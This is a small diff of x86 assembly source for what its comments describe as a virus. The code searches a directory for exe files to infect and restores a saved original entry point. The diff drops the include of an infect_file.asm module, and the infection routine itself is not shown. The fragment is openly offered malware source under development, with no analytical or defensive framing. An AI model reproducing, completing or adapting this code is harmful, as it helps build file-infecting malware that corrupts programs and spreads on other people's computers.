@@ -79,7 +79,7 @@ begin_copy:
 
   include utils.asm
  include search_files.asm   
-  include infect_file.asm
+  
   
 ; �������������������������������������������������������������������������
 ; PROCEDURES - END
@@ -329,7 +329,7 @@ ENDM
     
    ;include search_files_4.asm                   ; Loop for searching and infecting all exe files in the directory.
  
-
+   
    invoke start_search, addr win32finddata ,  addr file_regex , addr  win32finddata.cFileName         ; Loop for searching and infecting all exe files in the directory.
     invoke MessageBox, NULL, addr msgCaption, addr msgCaption, MB_OK
     mov  ecx, dword ptr[ebx + oldEntryPoint]        ; Load the old entry point RVA.
